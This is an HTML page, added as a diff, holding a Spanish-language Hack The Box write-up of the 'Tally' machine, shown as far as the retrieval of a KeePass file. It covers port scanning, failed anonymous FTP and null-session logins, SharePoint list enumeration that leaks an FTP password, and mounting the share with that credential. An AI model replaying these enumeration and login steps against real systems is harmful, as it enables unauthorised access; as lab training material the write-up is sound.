@@ -1,0 +1,1427 @@
+<!doctype html>
+<!--
+  Minimal Mistakes Jekyll Theme 4.15.1 by Michael Rose
+  Copyright 2013-2019 Michael Rose - mademistakes.com | @mmistakes
+  Free for personal and commercial use under the MIT license
+  https://github.com/mmistakes/minimal-mistakes/blob/master/LICENSE
+-->
+<html lang="en" class="no-js">
+  <head>
+    <meta charset="utf-8">
+
+<!-- begin _includes/seo.html --><title>            Hack The Box Tally - K4miyo      Ciberseguridad!      </title>
+<meta name="description" content="Resolución de la máquina Tally en la plataforma de Hack The Box">
+
+
+
+<meta property="og:type" content="article">
+<meta property="og:locale" content="en_US">
+<meta property="og:site_name" content="K4miyo | Ciberseguridad!">
+<meta property="og:title" content="Hack The Box Tally">
+<meta property="og:url" content="http://localhost:4000/htb-tally/">
+
+
+  <meta property="og:description" content="Resolución de la máquina Tally en la plataforma de Hack The Box">
+
+
+
+  <meta property="og:image" content="http://localhost:4000/assets/images/htb-tally/tally.jpg">
+
+
+
+
+
+  <meta property="article:published_time" content="2021-11-26T00:00:00-06:00">
+
+
+
+
+
+  
+
+  
+
+
+<link rel="canonical" href="http://localhost:4000/htb-tally/">
+
+
+
+
+
+
+
+  <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Person",
+      "name": "K4miyo",
+      "url": "http://localhost:4000",
+      "sameAs": null
+    }
+  </script>
+
+
+
+
+
+
+
+<!-- end _includes/seo.html -->
+
+
+<link href="/feed.xml" type="application/atom+xml" rel="alternate" title="K4miyo | Ciberseguridad! Feed">
+
+<!-- https://t.co/dKP3o1e -->
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<script>
+  document.documentElement.className = document.documentElement.className.replace(/\bno-js\b/g, '') + ' js ';
+</script>
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="/assets/css/main.css">
+
+<!--[if IE ]>
+  <style>
+    /* old IE unsupported flexbox fixes */
+    .greedy-nav .site-title {
+      padding-right: 3em;
+    }
+    .greedy-nav button {
+      position: absolute;
+      top: 0;
+      right: 0;
+      height: 100%;
+    }
+  </style>
+<![endif]-->
+
+
+
+    <!-- start custom head snippets -->
+
+<!-- insert favicons. use https://realfavicongenerator.net/ -->
+
+<!-- end custom head snippets -->
+
+  </head>
+
+  <body class="layout--single wide">
+
+    <!--[if lt IE 9]>
+<div class="notice--danger align-center" style="margin: 0;">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience.</div>
+<![endif]-->
+
+    
+
+<div class="masthead">
+  <div class="masthead__inner-wrap">
+    <div class="masthead__menu">
+      <nav id="site-nav" class="greedy-nav">
+        
+          <a class="site-logo" href="/"><img src="/assets/images/masthead.png" alt=""></a>
+                
+        <ul class="visible-links"><li class="masthead__menu-item">
+              <a href="/" >Home</a>
+            </li><li class="masthead__menu-item">
+              <a href="/year-archive/" >Artículos</a>
+            </li><li class="masthead__menu-item">
+              <a href="/categories/" >Categorías</a>
+            </li><li class="masthead__menu-item">
+              <a href="/tags/" >Etiquetas</a>
+            </li><li class="masthead__menu-item">
+              <a href="/buscador/" >Buscador</a>
+            </li><li class="masthead__menu-item">
+              <a href="/about/" >Contacto</a>
+            </li></ul>
+        
+        <button class="greedy-nav__toggle hidden" type="button">
+          <span class="visually-hidden">Toggle menu</span>
+          <div class="navicon"></div>
+        </button>
+        <ul class="hidden-links hidden"></ul>
+      </nav>
+    </div>
+  </div>
+</div>
+    
+
+    <div class="initial-content">
+      
+
+
+  
+    
+
+
+
+<nav class="breadcrumbs">
+  <ol itemscope itemtype="https://schema.org/BreadcrumbList">
+    
+    
+    
+      
+        <li itemprop="itemListElement" itemscope itemtype="https://schema.org/ListItem">
+          <a href="http://localhost:4000/" itemprop="item"><span itemprop="name">Home</span></a>
+          <meta itemprop="position" content="1" />
+        </li>
+        <span class="sep">/</span>
+      
+      
+        <li class="current">Hack The Box Tally</li>
+      
+    
+  </ol>
+</nav>
+
+  
+
+
+<div id="main" role="main">
+  
+  <div class="sidebar sticky">
+  
+
+
+<div itemscope itemtype="https://schema.org/Person">
+
+  
+    <div class="author__avatar">
+      
+
+      
+        <img src="/assets/images/avatar.png" alt="K4miyo" itemprop="image">
+      
+    </div>
+  
+
+  <div class="author__content">
+    
+      <h3 class="author__name" itemprop="name">K4miyo</h3>
+    
+    
+      <p class="author__bio" itemprop="description">
+        Cyber Threat Intelligence Analyst
+      </p>
+    
+  </div>
+
+  <div class="author__urls-wrapper">
+    <button class="btn btn--inverse">Follow</button>
+    <ul class="author__urls social-icons">
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+        <li>
+          <a href="https://github.com/k4miyo" itemprop="sameAs" rel="nofollow noopener noreferrer">
+            <i class="fab fa-fw fa-github" aria-hidden="true"></i> GitHub
+          </a>
+        </li>
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      
+
+      <!--
+  <li>
+    <a href="http://link-to-whatever-social-network.com/user/" itemprop="sameAs" rel="nofollow noopener noreferrer">
+      <i class="fas fa-fw" aria-hidden="true"></i> Custom Social Profile Link
+    </a>
+  </li>
+-->
+    </ul>
+  </div>
+</div>
+
+  
+  </div>
+
+
+  <article class="page" itemscope itemtype="https://schema.org/CreativeWork">
+    <meta itemprop="headline" content="Hack The Box Tally">
+    <meta itemprop="description" content="Resolución de la máquina Tally en la plataforma de Hack The Box">
+    <meta itemprop="datePublished" content="November 26, 2021">
+    
+
+    <div class="page__inner-wrap">
+      
+        <header>
+          <h1 id="page-title" class="page__title" itemprop="headline">Hack The Box Tally
+</h1>
+          
+        </header>
+      
+
+      <section class="page__content" itemprop="text">
+        
+        <p class="page__meta">
+          
+            <i class="fa fa-fw fa-calendar" aria-hidden="true"></i> <time datetime="2021-11-26T00:00:00-06:00">November 26, 2021 </time>&emsp;
+          
+          
+        </p>
+        <p><img src="/assets/images/htb-tally/banner-tally.jpg" alt="" /></p>
+
+<h2 id="tally">Tally</h2>
+<p>Se procede con la fase de reconocimiento lanzando primeramente un <code class="language-plaintext highlighter-rouge">ping</code> a la dirección IP 10.10.10.59.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ping <span class="nt">-c</span> 1 10.10.10.59
+PING 10.10.10.59 <span class="o">(</span>10.10.10.59<span class="o">)</span> 56<span class="o">(</span>84<span class="o">)</span> bytes of data.
+64 bytes from 10.10.10.59: <span class="nv">icmp_seq</span><span class="o">=</span>1 <span class="nv">ttl</span><span class="o">=</span>127 <span class="nb">time</span><span class="o">=</span>138 ms
+
+<span class="nt">---</span> 10.10.10.59 ping statistics <span class="nt">---</span>
+1 packets transmitted, 1 received, 0% packet loss, <span class="nb">time </span>0ms
+rtt min/avg/max/mdev <span class="o">=</span> 138.013/138.013/138.013/0.000 ms
+</code></pre></div></div>
+
+<p>De acuerdo con el TTL de traza ICMP, se puede determinar que se trata de una máquina con sistema operativo Windows. A continuación se procede con la ejecución de <code class="language-plaintext highlighter-rouge">nmap</code> para determinar los puertos abiertos de la máquina y exportanto la información al archivo <strong>allPorts</strong>.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-p-</span> <span class="nt">--open</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-vvv</span> <span class="nt">-n</span> <span class="nt">-Pn</span> 10.10.10.59 <span class="nt">-oG</span> allPorts
+Host discovery disabled <span class="o">(</span><span class="nt">-Pn</span><span class="o">)</span><span class="nb">.</span> All addresses will be marked <span class="s1">'up'</span> and scan <span class="nb">times </span>may be slower.
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-11-18 21:23 CST
+Initiating SYN Stealth Scan at 21:23         
+Scanning 10.10.10.59 <span class="o">[</span>65535 ports]           
+Discovered open port 139/tcp on 10.10.10.59  
+Discovered open port 80/tcp on 10.10.10.59   
+Discovered open port 21/tcp on 10.10.10.59 
+Discovered open port 445/tcp on 10.10.10.59  
+Discovered open port 135/tcp on 10.10.10.59 
+Discovered open port 5985/tcp on 10.10.10.59
+Discovered open port 49670/tcp on 10.10.10.59
+Discovered open port 32844/tcp on 10.10.10.59
+Discovered open port 32843/tcp on 10.10.10.59
+Discovered open port 49666/tcp on 10.10.10.59
+Discovered open port 49668/tcp on 10.10.10.59                                                                                    
+Discovered open port 47001/tcp on 10.10.10.59
+Discovered open port 49664/tcp on 10.10.10.59 
+Discovered open port 808/tcp on 10.10.10.59
+Discovered open port 32846/tcp on 10.10.10.59                                                                                    
+Discovered open port 1433/tcp on 10.10.10.59                                                                                     
+Discovered open port 81/tcp on 10.10.10.59
+Discovered open port 49669/tcp on 10.10.10.59
+Discovered open port 49665/tcp on 10.10.10.59
+Discovered open port 15567/tcp on 10.10.10.59
+Discovered open port 49667/tcp on 10.10.10.59
+Completed SYN Stealth Scan at 21:24, 19.22s elapsed <span class="o">(</span>65535 total ports<span class="o">)</span>
+Nmap scan report <span class="k">for </span>10.10.10.59            
+Host is up, received user-set <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>
+Scanned at 2021-11-18 21:23:45 CST <span class="k">for </span>19s  
+Not shown: 64411 closed tcp ports <span class="o">(</span>reset<span class="o">)</span>, 1103 filtered tcp ports <span class="o">(</span>no-response<span class="o">)</span>
+Some closed ports may be reported as filtered due to <span class="nt">--defeat-rst-ratelimit</span>
+PORT      STATE SERVICE      REASON
+21/tcp    open  ftp          syn-ack ttl 127
+80/tcp    open  http         syn-ack ttl 127
+81/tcp    open  hosts2-ns    syn-ack ttl 127
+135/tcp   open  msrpc        syn-ack ttl 127
+139/tcp   open  netbios-ssn  syn-ack ttl 127
+445/tcp   open  microsoft-ds syn-ack ttl 127
+808/tcp   open  ccproxy-http syn-ack ttl 127
+1433/tcp  open  ms-sql-s     syn-ack ttl 127
+5985/tcp  open  wsman        syn-ack ttl 127
+15567/tcp open  unknown      syn-ack ttl 127
+32843/tcp open  unknown      syn-ack ttl 127
+32844/tcp open  unknown      syn-ack ttl 127
+32846/tcp open  unknown      syn-ack ttl 127
+47001/tcp open  winrm        syn-ack ttl 127
+49664/tcp open  unknown      syn-ack ttl 127
+49665/tcp open  unknown      syn-ack ttl 127
+49666/tcp open  unknown      syn-ack ttl 127
+49667/tcp open  unknown      syn-ack ttl 127
+49668/tcp open  unknown      syn-ack ttl 127
+49669/tcp open  unknown      syn-ack ttl 127
+49670/tcp open  unknown      syn-ack ttl 127
+
+Read data files from: /usr/bin/../share/nmap
+Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned <span class="k">in </span>19.33 seconds
+           Raw packets sent: 94470 <span class="o">(</span>4.157MB<span class="o">)</span> | Rcvd: 73599 <span class="o">(</span>2.944MB<span class="o">)</span>
+</code></pre></div></div>
+
+<p>Mediante la función <a href="/extractPorts">extractPorts</a> definida a nivel de <code class="language-plaintext highlighter-rouge">zsh</code> , se obtiene la información más relevante de la captura grepeable.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ extractPorts allPorts
+───────┬─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+       │ File: extractPorts.tmp
+───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+   1   │ 
+   2   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Extracting information...
+   3   │ 
+   4   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> IP Address: 10.10.10.59
+   5   │     <span class="o">[</span><span class="k">*</span><span class="o">]</span> Open ports: 21,80,81,135,139,445,808,1433,5985,15567,32843,32844,32846,47001,49664,49665,49666,49667,49668,49669
+       │ ,49670
+   6   │ 
+   7   │ <span class="o">[</span><span class="k">*</span><span class="o">]</span> Ports copied to clipboard
+</code></pre></div></div>
+
+<p>A continuación se lanza una serie de scripts para determinar el servicio y versión que corren para los puertos detectados.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ nmap <span class="nt">-sC</span> <span class="nt">-sV</span> <span class="nt">-p21</span>,80,81,135,139,445,808,1433,5985,15567,32843,32844,32846,47001,49664,49665,49666,49667,49668,49669,49670 10.10
+.10.59 <span class="nt">-oN</span> targeted                                             
+Starting Nmap 7.92 <span class="o">(</span> https://nmap.org <span class="o">)</span> at 2021-11-18 21:25 CST 
+Nmap scan report <span class="k">for </span>10.10.10.59                                                                                                 
+Host is up <span class="o">(</span>0.14s latency<span class="o">)</span><span class="nb">.</span>                                     
+                                
+PORT      STATE SERVICE            VERSION                                                                                       
+21/tcp    open  ftp                Microsoft ftpd                                                                                
+| ftp-syst:                                                     
+|_  SYST: Windows_NT                                                                                                             
+80/tcp    open  http               Microsoft IIS httpd 10.0
+|_http-generator: Microsoft SharePoint                                                                                           
+| http-ntlm-info:                                                                                                                
+|   Target_Name: TALLY                                          
+|   NetBIOS_Domain_Name: TALLY                                                                                                   
+|   NetBIOS_Computer_Name: TALLY                        
+|   DNS_Domain_Name: TALLY                                      
+|   DNS_Computer_Name: TALLY                                    
+|_  Product_Version: 10.0.14393                                 
+|_http-server-header: Microsoft-IIS/10.0                                                                                         
+| http-title: Home            
+|_Requested resource was http://10.10.10.59/_layouts/15/start.aspx#/default.aspx
+81/tcp    open  http               Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Bad Request                                       
+135/tcp   open  msrpc              Microsoft Windows RPC                                                                         
+139/tcp   open  netbios-ssn        Microsoft Windows netbios-ssn          
+445/tcp   open  microsoft-ds       Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
+808/tcp   open  ccproxy-http?
+1433/tcp  open  ms-sql-s           Microsoft SQL Server 2016 13.00.1601.00<span class="p">;</span> RTM
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SSL_Self_Signed_Fallback
+| Not valid before: 2021-11-19T03:28:04                         
+|_Not valid after:  2051-11-19T03:28:04
+| ms-sql-ntlm-info:                                             
+|   Target_Name: TALLY         
+|   NetBIOS_Domain_Name: TALLY                                  
+|   NetBIOS_Computer_Name: TALLY 
+|   DNS_Domain_Name: TALLY
+|   DNS_Computer_Name: TALLY  
+|_  Product_Version: 10.0.14393                                 
+|_ssl-date: 2021-11-19T03:31:34+00:00<span class="p">;</span> +4m58s from scanner time.
+5985/tcp  open  http               Microsoft HTTPAPI httpd 2.0 <span class="o">(</span>SSDP/UPnP<span class="o">)</span>
+|_http-server-header: Microsoft-HTTPAPI/2.0                     
+|_http-title: Not Found                                                                                                          
+15567/tcp open  http               Microsoft IIS httpd 10.0                                                                      
+|_http-server-header: Microsoft-IIS/10.0                    
+| http-auth:                                                                                                                     
+| HTTP/1.1 401 Unauthorized<span class="se">\x</span>0D                                 
+|   Negotiate                                                                                                                    
+|_  NTLM
+|_http-title: Site doesn<span class="s1">'t have a title.
+| http-ntlm-info: 
+|   Target_Name: TALLY
+|   NetBIOS_Domain_Name: TALLY
+|   NetBIOS_Computer_Name: TALLY 
+|   DNS_Domain_Name: TALLY
+|   DNS_Computer_Name: TALLY
+|_  Product_Version: 10.0.14393
+32843/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Service Unavailable
+32844/tcp open  ssl/http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+| ssl-cert: Subject: commonName=SharePoint Services/organizationName=Microsoft/countryName=US
+| Subject Alternative Name: DNS:localhost, DNS:tally
+| Not valid before: 2017-09-17T22:51:16
+|_Not valid after:  9999-01-01T00:00:00
+|_ssl-date: 2021-11-19T03:31:34+00:00; +4m58s from scanner time. 
+|_http-title: Service Unavailable
+| tls-alpn: 
+|   h2
+|_  http/1.1
+32846/tcp open  storagecraft-image StorageCraft Image Manager
+47001/tcp open  http               Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
+|_http-server-header: Microsoft-HTTPAPI/2.0
+|_http-title: Not Found
+49664/tcp open  msrpc              Microsoft Windows RPC
+49665/tcp open  msrpc              Microsoft Windows RPC
+49666/tcp open  msrpc              Microsoft Windows RPC
+49667/tcp open  msrpc              Microsoft Windows RPC
+49668/tcp open  msrpc              Microsoft Windows RPC
+49669/tcp open  msrpc              Microsoft Windows RPC
+49670/tcp open  msrpc              Microsoft Windows RPC
+Service Info: OSs: Windows, Windows Server 2008 R2 - 2012; CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-security-mode: 
+|   3.1.1: 
+|_    Message signing enabled but not required
+| smb2-time: 
+|   date: 2021-11-19T03:31:12
+|_  start_date: 2021-11-19T03:27:44
+| ms-sql-info: 
+|   10.10.10.59:1433: 
+|     Version: 
+|       name: Microsoft SQL Server 2016 RTM
+|       number: 13.00.1601.00
+|       Product: Microsoft SQL Server 2016
+|       Service pack level: RTM
+|       Post-SP patches applied: false
+|_    TCP port: 1433
+| smb-security-mode: 
+|   account_used: guest
+|   authentication_level: user
+|   challenge_response: supported
+|_  message_signing: disabled (dangerous, but default)
+|_clock-skew: mean: 4m57s, deviation: 0s, median: 4m57s
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 89.10 seconds
+</span></code></pre></div></div>
+
+<p>Vemos varios puertos abiertos y como recomendación, vamos primero con aquellos que tengan presente el servicio HTTP. Antes de ingresar vía web, vamos a tratar de ver a lo que nos enfrentamos con la herramienta <code class="language-plaintext highlighter-rouge">whatweb</code>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.59/
+http://10.10.10.59/ <span class="o">[</span>302 Found] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.59], Microsoft-IIS[10.0], Microsoft-Sharepoint[15.0.0.4420], RedirectLocation[http://10.10.10.59/default.aspx], Title[Document Moved], UncommonHeaders[x-sharepointhealthscore,sprequestguid,request-id,sprequestduration,spiislatency,microsoftsharepointteamservices,x-content-type-options,x-ms-invokeapp], X-Frame-Options[SAMEORIGIN], X-Powered-By[ASP.NET]
+
+http://10.10.10.59/default.aspx <span class="o">[</span>200 OK] ASP_NET[4.0.30319], Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.59], MetaGenerator[Microsoft SharePoint], Microsoft-IIS[10.0], Microsoft-Sharepoint[15.0.0.4420], Script[text/javascript], Title[Home - Home][Title element contains newline<span class="o">(</span>s<span class="o">)!]</span>, UncommonHeaders[x-sharepointhealthscore,sprequestguid,request-id,sprequestduration,spiislatency,microsoftsharepointteamservices,x-content-type-options,x-ms-invokeapp], X-Frame-Options[SAMEORIGIN], X-Powered-By[ASP.NET], X-UA-Compatible[IE<span class="o">=</span>10]
+</code></pre></div></div>
+
+<p>Aquí vemos que se tiene un <strong>Microsoft Sharepoint</strong> el cual podemos ver si ingresamos vía web.</p>
+
+<p><img src="/assets/images/htb-tally/tally-sharepoint.png" alt="" /></p>
+
+<p>Otro puerto en el cual podría haber algo sería el 15567 que al ingresar vía web, nos solicita credenciales, las cuales no contamos.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ whatweb http://10.10.10.59:15567/
+http://10.10.10.59:15567/ <span class="o">[</span>401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.59], Microsoft-IIS[10.0], Microsoft-Sharepoint[15.0.0.4420], UncommonHeaders[sprequestguid,request-id,sprequestduration,spiislatency,microsoftsharepointteamservices,x-content-type-options,x-ms-invokeapp], WWW-Authenticate[Negotiate, NTLM], X-Frame-Options[SAMEORIGIN], X-Powered-By[ASP.NET]
+</code></pre></div></div>
+
+<p><img src="/assets/images/htb-tally/tally-http.png" alt="" /></p>
+
+<p>Analizando un poco más la información que tenemos, vemos el puerto 21 y el 445 abiertos a los cuales podríamos tratar de conectarnos como el usuario <em>anonymous</em> para el FTP y <em>null</em> para SMB; sin embargo, no podemos y no vemos nada interesante.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ftp 10.10.10.59                                               
+Connected to 10.10.10.59.                                       
+220 Microsoft FTP Service
+Name <span class="o">(</span>10.10.10.59:k4miyo<span class="o">)</span>: anonymous                                                                                             
+331 Password required
+Password:                                                       
+530 User cannot log <span class="k">in</span><span class="nb">.</span>                                                                                                          
+Login failed.                                                   
+Remote system <span class="nb">type </span>is Windows_NT.                                                                                                
+ftp&gt; quit        
+221 Goodbye.                                                                                                                     
+❯ crackmapexec smb 10.10.10.59 <span class="nt">--shares</span>
+SMB         10.10.10.59     445    TALLY            <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows Server 2016 Standard 14393 x64 <span class="o">(</span>name:TALLY<span class="o">)</span> <span class="o">(</span>domain:TALLY<span class="o">)</span> <span class="o">(</span>signi
+ng:False<span class="o">)</span> <span class="o">(</span>SMBv1:True<span class="o">)</span>                                          
+Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:                                                                                               
+  File <span class="s2">"/root/.local/pipx/venvs/crackmapexec/lib/python3.9/site-packages/impacket/nmb.py"</span>, line 983, <span class="k">in </span>non_polling_read
+    received <span class="o">=</span> self._sock.recv<span class="o">(</span>bytes_left<span class="o">)</span>                                                                                       
+  File <span class="s2">"/root/.local/pipx/venvs/crackmapexec/lib/python3.9/site-packages/gevent/_socketcommon.py"</span>, line 657, <span class="k">in </span>recv
+    <span class="k">return </span>self._sock.recv<span class="o">(</span><span class="k">*</span>args<span class="o">)</span>                                                                                                
+ConnectionResetError: <span class="o">[</span>Errno 104] Connection reset by peer
+❯ smbclient <span class="nt">-L</span> 10.10.10.59 <span class="nt">-N</span>
+session setup failed: NT_STATUS_ACCESS_DENIED
+</code></pre></div></div>
+
+<p>Vemos que también está el servicio <strong>Microsoft Windows RPC</strong> por lo que podríamos tratar de conectarnos con una null session:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ rpcclient <span class="nt">-U</span> <span class="s2">""</span> 10.10.10.59
+Enter WORKGROUP<span class="se">\'</span>s password: 
+Cannot connect to server.  Error was NT_STATUS_LOGON_FAILURE
+</code></pre></div></div>
+
+<p>Como no pudimos obtener informacion relevante de los puerto, vamos a regresar con el sitio web <strong><em>Microsoft Sharepoint</em></strong> y lo normal sería aplicar un fuzzing para tratar de descubrir recursos dentro de la máquina; sin embargo, debido a la lentitud de la misma, vamos a tratar de encontrar un recurso que nos ayude para probar rutas que podrían existir, para este caso, vamos a utilizar <a href="https://the-infosec.com/2017/04/18/penetration-testing-sharepoint/">the-infosec</a>. Utilizaremos el recurso <code class="language-plaintext highlighter-rouge">_layouts/15/viewlsts.aspx</code>:</p>
+
+<p><img src="/assets/images/htb-tally/tally-view.png" alt="" /></p>
+
+<p>Vemos que los directorios <strong>Documents</strong> y <strong>Site Pages</strong> presentan contenido, así que vamos a echarles un ojo. El directorio <strong>Documents</strong> tiene un archivo llamado <strong>ftp-details</strong>, así que vamos a descargarlo y ver su contenido.</p>
+
+<p><img src="/assets/images/htb-tally/tally-ftp.png" alt="" /></p>
+
+<p>Al abrir el archivo, nos aparece una contraseña de acceso por el servicio FTP; sin embargo, no contamos con el usuario.</p>
+
+<p><img src="/assets/images/htb-tally/tally-word.png" alt="" /></p>
+
+<p>Para el caso del directorio <strong>Site Pages</strong>, si checamos la dirección URL, nos sale algo como <code class="language-plaintext highlighter-rouge">http://10.10.10.59/_layouts/15/start.aspx#/SitePages/Forms/AllPages.aspx</code>; lo que se está aplicando una redirección incorrecta, así que vamos a eliminar la parte <code class="language-plaintext highlighter-rouge">_layouts/15/start.aspx#/</code> para que nos quede así <code class="language-plaintext highlighter-rouge">http://10.10.10.59/SitePages/Forms/AllPages.aspx</code>:</p>
+
+<p><img src="/assets/images/htb-tally/tally-site.png" alt="" /></p>
+
+<p>De igual forma, nos descargamos el recurso para ver su contenido. Hay que tener cuidado porque se aplica la redirección incorrecta y debemos de eliminar la misma parte <code class="language-plaintext highlighter-rouge">_layouts/15/start.aspx#/</code>:</p>
+
+<p><img src="/assets/images/htb-tally/tally-finance.png" alt="" /></p>
+
+<p>Leyendo un poco, vemos que se le está solicitando al usuario <strong>Rahul</strong> subir archivos usando la cuenta <strong>ftp_user</strong>. Por lo que ya a este punto, contamos con posibles credenciales válidas de acceso al servicio FTP, así que vamos a probarlas:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ ftp 10.10.10.59
+Connected to 10.10.10.59.
+220 Microsoft FTP Service
+Name <span class="o">(</span>10.10.10.59:k4miyo<span class="o">)</span>: ftp_user
+331 Password required
+Password:
+230 User logged <span class="k">in</span><span class="nb">.</span>
+Remote system <span class="nb">type </span>is Windows_NT.
+ftp&gt; <span class="nb">dir
+</span>200 PORT <span class="nb">command </span>successful.
+125 Data connection already open<span class="p">;</span> Transfer starting.
+08-31-17  10:51PM       &lt;DIR&gt;          From-Custodian
+10-01-17  10:37PM       &lt;DIR&gt;          Intranet
+08-28-17  05:56PM       &lt;DIR&gt;          Logs
+09-15-17  08:30PM       &lt;DIR&gt;          To-Upload
+09-17-17  08:27PM       &lt;DIR&gt;          User
+226 Transfer complete.
+ftp&gt; 
+</code></pre></div></div>
+
+<p>Vemos varios directorios dentro del servicio FTP. Para trabajar un poco más cómodos y poder visualizar todos los recursos, vamos a crearnos una montura con la herramienta <code class="language-plaintext highlighter-rouge">curlftpfs</code> (<strong>Nota</strong>: Si no tenemos la herramienta, la podemos instalar con <code class="language-plaintext highlighter-rouge">apt-get install curlftpfs</code>):</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">mkdir</span> /mnt/ftp
+❯ curlftpfs ftp_user:UTDRSCH53c<span class="se">\"\$</span>6hys@10.10.10.59 /mnt/ftp/
+</code></pre></div></div>
+
+<p>Ahora accedemos a la ruta en nuestro sistema <code class="language-plaintext highlighter-rouge">/mnt/ftp</code> y podemos visualizar el contenido del servicio FTP de la máquina víctima.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ <span class="nb">cd</span> /mnt/ftp/
+❯ ll
+d--------- root root 0 B Thu Aug 31 23:51:00 2017  From-Custodian
+d--------- root root 0 B Sun Oct  1 23:37:00 2017  Intranet
+d--------- root root 0 B Mon Aug 28 18:56:00 2017  Logs
+d--------- root root 0 B Fri Sep 15 21:30:00 2017  To-Upload
+d--------- root root 0 B Sun Sep 17 21:27:00 2017  User
+</code></pre></div></div>
+
+<p>Si ejecutamos el comando <code class="language-plaintext highlighter-rouge">tree</code> nos aparecerá mucha información, por lo que vamos a filtrarla omitiendo aquellos archivos que tengan <strong>RED-</strong> y <strong>ftp_connect</strong>:</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>❯ tree | <span class="nb">grep</span> <span class="nt">-i</span> <span class="nt">-v</span> <span class="nt">-E</span> <span class="s2">"red-|ftp_connect"</span>
+<span class="nb">.</span>                                                               
+├── From-Custodian
+├── Intranet                                                    
+│   └── Binaries
+│       └── Firefox Setup 44.0.2.exe
+├── Logs                                                                  
+├── To-Upload         
+│   ├── employees-id_number.xlsx
+│   └── Invoices.zip      
+└── User     
+    ├── Administrator           
+    │   └── New folder
+    ├── Ekta                                                    
+    │   ├── OFSI_quick_guide_flyer.pdf
+    │   └── PSAIS_1_April_2017.pdf
+    ├── Jess                                                    
+    │   └── actu8-espreadsheet-designer-datasheet.pdf
+    ├── Paul     
+    │   ├── financial-list-guide.pdf
+    │   ├── financial_sanctions_guidance_august_2017.pdf
+    │   ├── Monetary_penalties_for_breaches_of_financial_sanctions.pdf
+    │   └── New folder         
+    ├── Rahul                                                   
+    │   └── Mockups-Backup                                      
+    ├── Sarah                                                   
+    │   ├── MBSASetup-x64-EN.msi                                
+    │   ├── notes.txt          
+    │   └── Windows-KB890830-x64-V5.52.exe
+    ├── Stuart                                                  
+    │   ├── customers - Copy.csv
+    │   └── Unit4-Connect-Financials-Agenda.pdf
+    ├── Tim                                                     
+    │   ├── Files                                               
+    │   │   ├── bonus.txt                                       
+    │   │   ├── KeePass-2.36                                    
+    │   │   │   ├── KeePass.chm
+    │   │   │   ├── KeePass.exe
+    │   │   │   ├── KeePass.exe.config
+    │   │   │   ├── KeePassLibC32.dll
+    │   │   │   ├── KeePassLibC64.dll
+    │   │   │   ├── KeePass.XmlSerializers.dll
+    │   │   │   ├── License.txt
+    │   │   │   ├── Plugins
+    │   │   │   ├── ShInstUtil.exe
+    │   │   │   └── XSL
+    │   │   │       ├── KDBX_Common.xsl
+    │   │   │       ├── KDBX_DetailsFull_HTML.xsl
+    │   │   │       ├── KDBX_DetailsLight_HTML.xsl
+    │   │   │       ├── KDBX_PasswordsOnly_TXT.xsl
+    │   │   │       └── KDBX_Tabular_HTML.xsl
+    │   │   └── tim.kdbx
+    │   └── Project
+    │       ├── Communications
+    │       ├── Log
+    │       │   └── <span class="k">do </span>to.txt
+    │       └── Vendors
+    └── Yenwi
+        └── Archive
+
+27 directories, 130 files
+</code></pre></div></div>
+
+<p>Algo que debemos de notar es que el posible usuario <strong>Tim</strong> tiene un archivo de extensión <strong>kdbx</strong>, asociado a la aplicación <strong>Keepass</strong> para guardar credenciales; así que vamos a traerlo a nuestro directorio de trabajo.</p>
+
